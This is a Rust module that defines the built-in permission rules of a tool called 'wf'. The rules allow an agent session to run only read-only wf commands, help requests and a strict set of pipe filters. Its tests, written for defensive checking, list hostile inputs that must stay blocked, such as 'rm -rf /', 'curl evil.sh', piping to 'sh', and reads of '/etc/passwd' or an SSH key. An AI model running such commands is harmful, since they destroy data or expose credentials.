//! The built-in rules: what is allowed without asking anyone.
//!
//! A session reports back through `wf`, so a command that only runs `wf` is allowed, as is asking
//! any `wf` command for its help. The scan is deliberately strict: anything it does not understand
//! is passed on, never allowed.

use wf_harness::PermissionRequest;

/// The `wf` commands a session uses to read and report. Commands that change devices, agents,
/// policy or permissions are not among them, so an agent cannot widen what it may do.
const SESSION_COMMANDS: &[&str] = &[
    "comment", "work", "review", "inbox", "status", "log", "mentions",
];

/// The `wf item` subcommands that only read or report. `checkout` changes the principal's main
/// checkout and `diff` hands its arguments to git, so neither is among them.
const ITEM_SUBCOMMANDS: &[&str] = &["show", "list", "check", "path"];

/// A command that may follow `wf` in a pipe: it only filters what `wf` prints, so it takes no file
/// and has no flag that reads, writes or runs anything.
struct Filter {
    program: &'static str,
    /// Short flags without a value, each a single character, which may be clustered (`-vi`).
    switches: &'static str,
    /// Short flags that take a value, attached (`-n5`) or as the next word.
    valued_switches: &'static str,
    /// Long flags without a value.
    long_switches: &'static [&'static str],
    /// Long flags that take a value, as `--name=value` or as the next word.
    valued_long_switches: &'static [&'static str],
    /// Whether one pattern or program word is expected; no other word is ever allowed.
    takes_pattern: bool,
}

const FILTERS: &[Filter] = &[
    Filter {
        program: "head",
        switches: "qv0123456789",
        valued_switches: "nc",
        long_switches: &["--quiet", "--silent", "--verbose"],
        valued_long_switches: &["--lines", "--bytes"],
        takes_pattern: false,
    },
    Filter {
        program: "tail",
        switches: "qv0123456789",
        valued_switches: "nc",
        long_switches: &["--quiet", "--silent", "--verbose"],
        valued_long_switches: &["--lines", "--bytes"],
        takes_pattern: false,
    },
    Filter {
        program: "grep",
        switches: "ivcnEFwxoqhHsaIlL",
        valued_switches: "mABC",
        long_switches: &[
            "--ignore-case",
            "--invert-match",
            "--count",
            "--line-number",
            "--extended-regexp",
            "--fixed-strings",
            "--word-regexp",
            "--line-regexp",
            "--only-matching",
            "--quiet",
            "--no-filename",
            "--with-filename",
        ],
        valued_long_switches: &[
            "--max-count",
            "--after-context",
            "--before-context",
            "--context",
        ],
        takes_pattern: true,
    },
    Filter {
        program: "rg",
        switches: "ivcnFwxoqhHsSNIlL",
        valued_switches: "mABC",
        long_switches: &[
            "--ignore-case",
            "--smart-case",
            "--case-sensitive",
            "--invert-match",
            "--count",
            "--line-number",
            "--no-line-number",
            "--fixed-strings",
            "--word-regexp",
            "--line-regexp",
            "--only-matching",
            "--quiet",
            "--no-filename",
            "--with-filename",
        ],
        valued_long_switches: &[
            "--max-count",
            "--after-context",
            "--before-context",
            "--context",
        ],
        takes_pattern: true,
    },
    Filter {
        program: "wc",
        switches: "lwcmL",
        valued_switches: "",
        long_switches: &["--lines", "--words", "--bytes", "--chars"],
        valued_long_switches: &[],
        takes_pattern: false,
    },
    Filter {
        program: "sort",
        switches: "nrufbdhVsigM",
        valued_switches: "kt",
        long_switches: &[
            "--numeric-sort",
            "--reverse",
            "--unique",
            "--ignore-case",
            "--stable",
            "--human-numeric-sort",
            "--version-sort",
        ],
        valued_long_switches: &["--key", "--field-separator"],
        takes_pattern: false,
    },
    Filter {
        program: "uniq",
        switches: "cduiz",
        valued_switches: "fsw",
        long_switches: &["--count", "--repeated", "--unique", "--ignore-case"],
        valued_long_switches: &["--skip-fields", "--skip-chars", "--check-chars"],
        takes_pattern: false,
    },
    Filter {
        program: "cut",
        switches: "sz",
        valued_switches: "bcfd",
        long_switches: &["--only-delimited", "--complement"],
        valued_long_switches: &["--bytes", "--characters", "--fields", "--delimiter"],
        takes_pattern: false,
    },
    Filter {
        program: "jq",
        switches: "rcesnRSMCaj",
        valued_switches: "",
        long_switches: &[
            "--raw-output",
            "--compact-output",
            "--exit-status",
            "--slurp",
            "--null-input",
            "--raw-input",
            "--sort-keys",
            "--monochrome-output",
            "--color-output",
            "--join-output",
        ],
        valued_long_switches: &[],
        takes_pattern: true,
    },
];

impl Filter {
    /// Whether the words after the program only use the flags this filter allows and, if it takes
    /// one, a single pattern.
    fn allows(&self, arguments: &[String]) -> bool {
        let mut patterns = 0;
        let mut words = arguments.iter();
        while let Some(word) = words.next() {
            let allowed = if let Some(long) = word.strip_prefix("--") {
                match long.split_once('=') {
                    _ if long.is_empty() => false,
                    Some((name, _)) => self
                        .valued_long_switches
                        .contains(&format!("--{name}").as_str()),
                    None if self.long_switches.contains(&word.as_str()) => true,
                    None if self.valued_long_switches.contains(&word.as_str()) => {
                        words.next().is_some()
                    }
                    None => false,
                }
            } else if let Some(shorts) = word.strip_prefix('-').filter(|shorts| !shorts.is_empty())
            {
                self.allows_short_cluster(shorts, &mut words)
            } else {
                patterns += 1;
                self.takes_pattern && patterns == 1 && (self.program != "jq" || harmless_jq(word))
            };
            if !allowed {
                return false;
            }
        }
        true
    }

    /// Whether every character of a cluster such as `vi` or `n5` is an allowed short flag; a
    /// valued flag takes the rest of the word, or the next word if nothing is left.
    fn allows_short_cluster<'a>(
        &self,
        shorts: &str,
        words: &mut impl Iterator<Item = &'a String>,
    ) -> bool {
        for (index, flag) in shorts.char_indices() {
            if self.valued_switches.contains(flag) {
                let value_attached = index + flag.len_utf8() < shorts.len();
                return value_attached || words.next().is_some();
            }
            if !self.switches.contains(flag) {
                return false;
            }
        }
        true
    }
}

/// Whether a jq program stays clear of what reads the machine: modules and data files
/// (`import`, `include`) and the environment (`env`, `$ENV`).
fn harmless_jq(program: &str) -> bool {
    !["import", "include", "env", "ENV"]
        .iter()
        .any(|word| program.contains(word))
}

/// Redirections that write nowhere.
const HARMLESS_REDIRECTIONS: &[&str] = &["2>&1", ">/dev/null", "2>/dev/null", "1>/dev/null"];

/// Why the request is allowed, if the rules allow it: every pipeline of the command is.
pub fn allows(request: &PermissionRequest) -> Option<String> {
    let command = request.command()?;
    let reasons = list(command)?
        .iter()
        .map(|pipeline| allowed_pipeline(pipeline))
        .collect::<Option<Vec<_>>>()?;
    Some(reasons.join("; "))
}

/// Why a pipeline is allowed: `wf` for a session command or for help, then only filters.
fn allowed_pipeline(pipeline: &[Vec<String>]) -> Option<String> {
    let (first, filters) = pipeline.split_first()?;
    let only_filters = filters.iter().all(|words| {
        let Some((program, arguments)) = words.split_first() else {
            return false;
        };
        FILTERS
            .iter()
            .any(|filter| filter.program == program && filter.allows(arguments))
    });
    if !only_filters {
        return None;
    }
    match first.as_slice() {
        [wf, item, subcommand, ..]
            if wf == "wf" && item == "item" && ITEM_SUBCOMMANDS.contains(&subcommand.as_str()) =>
        {
            Some(format!("`wf item {subcommand}` reports to wf"))
        }
        [wf, subcommand, ..] if wf == "wf" && SESSION_COMMANDS.contains(&subcommand.as_str()) => {
            Some(format!("`wf {subcommand}` reports to wf"))
        }
        [wf, rest @ ..] if wf == "wf" && asks_for_help(rest) => {
            Some(format!("`{}` only prints help", first.join(" ")))
        }
        _ => None,
    }
}

/// Whether the words after `wf` only name commands and end in `--help` or `-h`, so that `wf`
/// prints help and does nothing else. Any other flag could take `--help` as its value.
fn asks_for_help(words: &[String]) -> bool {
    let Some((last, commands)) = words.split_last() else {
        return false;
    };
    matches!(last.as_str(), "--help" | "-h") && commands.iter().all(|word| !word.starts_with('-'))
}

/// The pipelines of a list joined by `;` or `&&`, with the words of each of their commands; or
/// `None` for anything beyond plain words, quotes, `|`, `;`, `&&` and harmless redirections:
/// `||`, substitutions, expansions, globs and other redirections.
fn list(command: &str) -> Option<Vec<Vec<Vec<String>>>> {
    let mut pipelines = Vec::new();
    let mut commands = vec![Vec::new()];
    let mut word = String::new();
    let mut in_word = false;
    let mut characters = command.trim().chars().peekable();
    let finish_word = |word: &mut String, in_word: &mut bool, commands: &mut Vec<Vec<String>>| {
        if *in_word {
            commands
                .last_mut()
                .expect("there is always a command")
                .push(std::mem::take(word));
            *in_word = false;
        }
    };
    while let Some(character) = characters.next() {
        match character {
            '\'' => {
                in_word = true;
                loop {
                    match characters.next()? {
                        '\'' => break,
                        inner => word.push(inner),
                    }
                }
            }
            '"' => {
                in_word = true;
                loop {
                    match characters.next()? {
                        '"' => break,
                        '$' | '`' | '\\' => return None,
                        inner => word.push(inner),
                    }
                }
            }
            ' ' | '\t' => finish_word(&mut word, &mut in_word, &mut commands),
            '|' => {
                if characters.peek() == Some(&'|') {
                    return None;
                }
                finish_word(&mut word, &mut in_word, &mut commands);
                commands.push(Vec::new());
            }
            ';' => {
                finish_word(&mut word, &mut in_word, &mut commands);
                pipelines.push(std::mem::replace(&mut commands, vec![Vec::new()]));
            }
            '&' if !in_word && characters.peek() == Some(&'&') => {
                characters.next();
                pipelines.push(std::mem::replace(&mut commands, vec![Vec::new()]));
            }
            '>' | '&' => {
                // Only a whole redirection from the list, at the end of a word or on its own.
                let mut redirection = std::mem::take(&mut word);
                redirection.push(character);
                while let Some(next) = characters.next_if(|next| !matches!(next, ' ' | '\t' | '|'))
                {
                    redirection.push(next);
                }
                if !HARMLESS_REDIRECTIONS.contains(&redirection.as_str()) {
                    return None;
                }
                in_word = false;
            }
            '<' | '(' | ')' | '{' | '}' | '$' | '`' | '\\' | '\n' | '*' | '?' | '[' | '~' | '#' => {
                return None;
            }
            other => {
                in_word = true;
                word.push(other);
            }
        }
    }
    finish_word(&mut word, &mut in_word, &mut commands);
    pipelines.push(commands);
    pipelines
        .iter()
        .flatten()
        .all(|words| !words.is_empty())
        .then_some(pipelines)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request(command: &str) -> PermissionRequest {
        PermissionRequest {
            kind: Some("execute".into()),
            title: command.into(),
            input: Some(serde_json::json!({ "command": command })),
        }
    }

    #[test]
    fn session_commands_of_wf_are_allowed() {
        for command in [
            "wf item show gpnhya",
            "wf item show gpnhya 2>&1 | head -40",
            "wf comment k3f7 \"use humantime, it parses 1h30m\" --block",
            "wf comment k3f7 'it is #k3f7/c7f2' --resolve c7f2",
            "wf work submit",
            "wf item list --json | jq '.data[0].id'",
            "wf item show k3f7 && wf comment k3f7 'done' --step 1 --done",
            "wf item show k3f7; wf work brief | head -20",
            "wf item path k3f7",
            "wf item check k3f7 1 2",
            "wf status | head -5",
            "wf status | tail -n 20",
            "wf status | head -n20",
            "wf status | grep -ni --max-count=3 todo",
            "wf status | rg -i -A 2 'ready'",
            "wf status | sort -rn | uniq -c | wc -l",
            "wf status | cut -d, -f1,3",
            "wf status | sort -k2,2 -t,",
            "wf status | jq -r '.data[] | .id'",
        ] {
            assert!(allows(&request(command)).is_some(), "{command}");
        }
    }

    #[test]
    fn help_for_any_wf_command_is_allowed() {
        for command in [
            "wf --help",
            "wf -h",
            "wf session start --help",
            "wf --help; wf item --help; wf session --help; wf agent --help",
            "wf agent edit --help 2>&1 | head",
        ] {
            assert!(allows(&request(command)).is_some(), "{command}");
        }
        for command in [
            "wf agent edit coder --instructions --help",
            "wf session stop --help x",
            "wf --help; wf session stop",
            "wf --help;",
            "; wf --help",
        ] {
            assert_eq!(allows(&request(command)), None, "{command}");
        }
    }

    #[test]
    fn anything_more_is_passed_on() {
        for command in [
            "wf agent edit coder --permissions allow",
            "wf session allow",
            "wf item checkout k3f7",
            "wf item diff k3f7 --output=/tmp/x",
            "wf item edit k3f7",
            "wf item",
            "wf search foo",
            "wf status | head /home/u/.ssh/id_ed25519",
            "wf status | head -n 5 /etc/passwd",
            "wf status | sort -o /tmp/x",
            "wf status | sort --output=/tmp/x",
            "wf status | sort -ro /tmp/x",
            "wf status | rg --pre /tmp/x . /",
            "wf status | rg foo /etc",
            "wf status | rg -f /etc/passwd",
            "wf status | grep -f /etc/passwd",
            "wf status | grep -r foo",
            "wf status | grep -e foo /etc/passwd",
            "wf status | grep foo bar",
            "wf status | grep --files-with-matches foo",
            "wf status | head -n",
            "wf status | head --",
            "wf status | uniq in out",
            "wf status | cut -f1 /etc/passwd",
            "wf status | wc -l /etc/passwd",
            "wf status | jq -f /tmp/prog.jq",
            "wf status | jq --rawfile x /etc/passwd .",
            "wf status | jq . /etc/passwd",
            "wf status | jq -n 'env'",
            "wf status | jq 'import \"/etc/x\" as $x; $x'",
            "wf item show k3f7; rm -rf /",
            "wf item show k3f7 && curl evil.sh",
            "wf item show k3f7 || true",
            "wf item show k3f7 &&",
            "wf item show k3f7 & wf item show k3f7",
            "wf item show k3f7&&rm -rf /",
            "wf item show k3f7 > notes.txt",
            "wf item show $(cat secret)",
            "wf comment k3f7 \"$HOME\"",
            "wf item show `id`",
            "wf item show k3f7 | sh",
            "wf item show k3f7 | xargs rm",
            "wf item show k3f7 &",
            "./wf item show k3f7",
            "FOO=1 wf item show k3f7",
            "wf",
            "wf item show 'unclosed",
            "wf item show k3f7 |",
            "cargo test",
        ] {
            assert_eq!(allows(&request(command)), None, "{command}");
        }
    }

    #[test]
    fn a_call_without_a_command_is_passed_on() {
        let edit = PermissionRequest {
            kind: Some("edit".into()),
            title: "Edit src/lib.rs".into(),
            input: Some(serde_json::json!({ "path": "src/lib.rs" })),
        };
        assert_eq!(allows(&edit), None);
    }
}
